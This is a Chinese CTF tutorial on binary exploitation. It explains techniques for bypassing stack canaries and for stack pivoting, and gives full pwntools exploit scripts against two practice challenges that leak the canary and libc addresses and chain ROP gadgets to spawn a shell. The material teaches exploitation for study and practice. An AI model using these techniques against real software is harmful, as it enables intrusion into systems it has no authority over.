原创： GD 合天智汇

## 0x00前言  

对于刚开始入门pwn的萌新来说可能会遇到一些坑，这里我就来总结一下我之前做栈溢出的时候遇到的两种坑以及绕过技巧，具体我会通过例题来讲解，希望对此时正在入门的pwn的萌新能带来一些帮助。

## 0x01绕过canary  

canary是linux下的保护机制，它会保存在栈的某个位置上，一般来说64位的话会在rbp-0x8的位置，32位则在ebp-0x4的位置。当我们进行栈溢出的时候如果覆盖了canary值，程序就会调用stack_chk_fail来打印报错信息。在做题的时候最烦的就是这种，大大增加了栈溢出时的难度。通常有以下几种绕过方法：

1、通过read函数泄露canary。关键的一点就是read函数读取字符串的时候不会在末尾加上“\x00”,这就是gets函数不能用来泄露canary的原因（有些输出函数遇到‘\0’会截断）。

2、暴力破解canary。这种方法利用起来有限制，就是一般要程序中有fork函数创造出子进程，因为子进程是父进程复制出来的，所以canary也就跟父进程相同，在子进程中覆盖canary后报错就会退回到父进程，此时canary的值是不会改变的。

3、劫持stack_chk_fail。因为canary被覆盖的时候会调用这个函数，所以如果我们可以利用程序中的漏洞（比如格式化字符串）改got表中stack_chk_fail的地址为one_gadget的地址就能getshell。

4、利用stack_chk_fail的报错信息。在报错信息中，会将你发生栈溢出的程序名调用输出，其位置位于argv[0]，我们可以将argv[0]的地址改写为我们想要获取的内容的地址，使它随着错误提示一起输出。

这里我主要是介绍第一种方法

## “百度杯” 十二月场 easypwn  

1、我们来简单运行一下并看一下它的保护，这里主要开启了NX和canary保护。

![v2-35a34830c257fbb***9ac478387a51cd_hd.j](https://pic1.zhimg.com/80/v2-35a34830c257fbb***9ac478387a51cd_hd.jpg)

![v2-7555b6e9717bc3f62ed3cb4c62244c2c_hd.j](https://pic4.zhimg.com/80/v2-7555b6e9717bc3f62ed3cb4c62244c2c_hd.jpg)

2、用ida打开反编译，这个程序比较简单，有两处栈溢出，第一处栈溢出主要利用read函数泄露canary，第二处就可以正常地ROP了。

![v2-d5591511d6b406dd56964f06b131e506_hd.j](https://pic3.zhimg.com/80/v2-d5591511d6b406dd56964f06b131e506_hd.jpg)

3、我们来看一下它的栈结构，buf在rbp-0x50的位置，而canary在rbp-0x8的位置，偏移为0x48.

![v2-322f90aea8afb85f73ae790872bafbc6_hd.j](https://pic3.zhimg.com/80/v2-322f90aea8afb85f73ae790872bafbc6_hd.jpg)

![v2-39f9aefef3c517131666c96348a088a1_hd.j](https://pic1.zhimg.com/80/v2-39f9aefef3c517131666c96348a088a1_hd.jpg)

4、这里我们可以构造0x48个a字符，因为末尾没有‘\0’，所以调用printf函数的时候就会把后面的canary泄露出来，这里要普及的一个知识点就是canary最低一个字节是“\x00”，所以泄露出来之后要减去0xa。

io.recvuntil('Who are you?\n')io.sendline('a'*0x48)
io.recvuntil('a'*0x48)canary=u64(io.recv(8))-0xaprint hex(canary)

![v2-3815294311b18c2d7048f264ff10c23c_hd.j](https://pic2.zhimg.com/80/v2-3815294311b18c2d7048f264ff10c23c_hd.jpg)

5、接下来要用到的是syscall系统调用的情况，调用号是0x3b就是execve()函数，利用read函数的返回值使得rax为0x3b，因为这主要讲的是canary，在这里就不详述系统调用了，下面贴上完整exp

from pwn import *context.binary = './easypwn'context.terminal =
['tmux','sp','-h']context.log_level = 'debug'elf = ELF('./easypwn')io =
process('./easypwn')#io = remote('106.75.66.195', 20000)#leak
Canaryio.recvuntil('Who are you?\n')io.sendline('a'*0x48)
io.recvuntil('a'*0x48)canary=u64(io.recv(8))-0xaprint
hex(canary)log.info('canary:'+hex(canary))#leak read_addrio.recvuntil('tell me
your real name?\n')payload = 'A'*(0x50-0x8)payload += p64(canary)payload +=
'A'*0x8payload += p64(0x4007f3)payload += p64(elf.got['read'])payload +=
p64(elf.plt['puts'])payload += p64(0x4006C6)io.send(payload)io.recvuntil('See
you again!\n')#cacl syscall_addrread_addr =
u64(io.recvuntil('\n',drop=True).ljust(0x8,'\x00'))print
'read_addr:'+hex(read_addr)syscall = read_addr+0xe
log.info('syscall:'+hex(syscall))sleep(0.5)io.recvuntil('Who are
you?\n')io.sendline('A'*(0x50-0x8)) io.recvuntil('tell me your real
name?\n')payload = 'A'*(0x50-0x8)payload += p64(canary)payload +=
'A'*0x8payload += p64(0x4007EA)payload +=
p64(0)+p64(1)+p64(elf.got['read'])+p64(0x3B)+p64(0x601018)+p64(0)payload +=
p64(0x4007D0)payload += p64(0)payload +=
p64(0)+p64(1)+p64(0x601020)+p64(0)+p64(0)+p64(0x601018)payload +=
p64(0x4007D0)io.send(payload)sleep(0.5) content =
'/bin/sh\x00'+p64(syscall)content =
content.ljust(0x3B,'0')io.send(content)io.interactive()

## 0x02栈迁移  

我们在做栈溢出的时候经常会遇到这样的问题，就是溢出的长度不够，这时候需要把栈迁移到我们能够控制的空间里去。这里主要用到汇编语言里的leave
ret，我们来看一下leave，在64位下相当

mov rsp,rbppop rbp

就是说我们只要通过栈溢出控制了rbp，就能控制rsp，把栈迁移到我们想要的空间。这里有一个可能有误会的就是这个mov
rsp,rbp，这个rbp指的是rbp的值，而不是我们要覆盖的rbp的值，后面的pop rbp才是把我们覆盖的值，即rbp锁指向的栈空间的值赋值给rsp。

## 具体例子  

这个题目是xman夏令营个人排位赛的一道pwn题（task_main_p3IegA3）

1、还是老样子先运行一遍再看保护，这里只开启了NX保护

![v2-07859b7a1a255d44b11e1a3a18efc700_hd.j](https://pic2.zhimg.com/80/v2-07859b7a1a255d44b11e1a3a18efc700_hd.jpg)

![v2-21717e8c1f8807fc617f3f5ed53c7041_hd.j](https://pic2.zhimg.com/80/v2-21717e8c1f8807fc617f3f5ed53c7041_hd.jpg)

2、ida反编译看下，这个程序非常简单，就只有几行代码，第一次输入保存在bss段，第二次输入在栈上，溢出的长度只能刚好覆盖到返回地址。。这时就需要我们把栈迁移到bss段上。

![v2-70d2dae522cf2241e3180ab07c5d6fef_hd.j](https://pic1.zhimg.com/80/v2-70d2dae522cf2241e3180ab07c5d6fef_hd.jpg)

3、我们先用ROPgadget工具找到合适gadget，0x40060f就是我们想要的。

![v2-4b237f6b550a3b5e876b98f3a155fe0f_hd.j](https://pic1.zhimg.com/80/v2-4b237f6b550a3b5e876b98f3a155fe0f_hd.jpg)

4、我们先来控制栈，我们不能把栈迁移到bss段一开始的地方，所以这里buf是我们输入的bss段+0x100的地址，因为程序本身就会执行leave
ret汇编，执行的时候pop rbp，所以会把rbp移到bss段。但是此时rsp还留在栈上，所以我们把gadget填到返回地址就行。

p.recvuntil('stack:\n')payload1='a'*10+p64(buf)+p64(leve_ret)
p.sendline(payload1)

5、下一步就是布置bss段上的数据，可以看出，栈已经被迁移到bss段了，这里会输出puts的地址。

payload='A'*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)
p.recvuntil('bss:\n')p.sendline(payload)

![v2-6a3e68281c02f1bbcc0a3aa970278826_hd.j](https://pic2.zhimg.com/80/v2-6a3e68281c02f1bbcc0a3aa970278826_hd.jpg)

6、最后一步只需要把one_gadget填到返回地址就行啦。附上完整exp。

from pwn
import*context.log_level=Truep=process('./task_main_p3IegA3')#p=remote()elf=ELF('task_main_p3IegA3')libc=ELF('libc.so.6')buf=elf.bss()+0x20+0X100print
hex(buf)puts_plt=elf.plt['puts']puts_got=elf.got['puts']read_plt=elf.plt['read']main=0x040061D
leve_ret=0x040060Fpopret=0x0400693
payload='A'*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)
p.recvuntil('bss:\n')p.sendline(payload)
p.recvuntil('stack:\n')payload1='a'*10+p64(buf)+p64(leve_ret)
p.sendline(payload1) #p.recv()
putsadd=u64(p.recvuntil('\n',drop=True).ljust(0x8,'\x00'))print hex(putsadd)
libc_base = putsadd- libc.sym['puts']one_gadget = libc_base +
0x4526ap.recv()p.send("1")p.recv()pay= 18*'a' +
p64(one_gadget)p.send(pay)p.interactive()

## 合天实验推荐  

高级栈溢出技术—ROP实战：

[课程:高级栈溢出技术-ROP实战(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCID31b0-fe03-4277-8e2f-504c4960d33f)

（ROP的全称为Return-oriented
programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等），攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

